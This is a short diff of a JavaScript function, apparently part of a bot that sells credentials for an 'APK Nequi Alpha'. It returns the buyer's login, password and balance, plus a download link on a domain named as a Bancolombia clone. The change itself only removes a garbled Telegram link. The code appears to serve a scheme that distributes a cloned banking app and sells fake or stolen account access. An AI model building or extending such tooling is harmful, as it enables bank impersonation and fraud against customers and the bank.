@@ -1854,7 +1854,7 @@ async function unlinkUserDevice(phoneNumber) {
             
             if (result.success) {
                 // Formatear una respuesta bonita
-                return `🔰Los datos de acceso para la APK Nequi Alpha son: \n\nNumero Cel 📲:  ${result.userData.email}\nClave 🔑: ${result.userData.password}\nSaldo💵: ${result.userData.saldo}\n\nUnete al grupo de telegram httpmVh🟢Descarga la Aplicacion aqui: https://bancolombia-clon.web.app/pages/home-alpha.html \n\nGracias por tu compra🤝🏻`;
+                return `🔰Los datos de acceso para la APK Nequi Alpha son: \n\nNumero Cel 📲:  ${result.userData.email}\nClave 🔑: ${result.userData.password}\nSaldo💵: ${result.userData.saldo}\n\n🟢Descarga la Aplicacion aqui: https://bancolombia-clon.web.app/pages/home-alpha.html \n\nGracias por tu compra🤝🏻`;
             } else {
                 return `❌ ${result.message}`;
             }
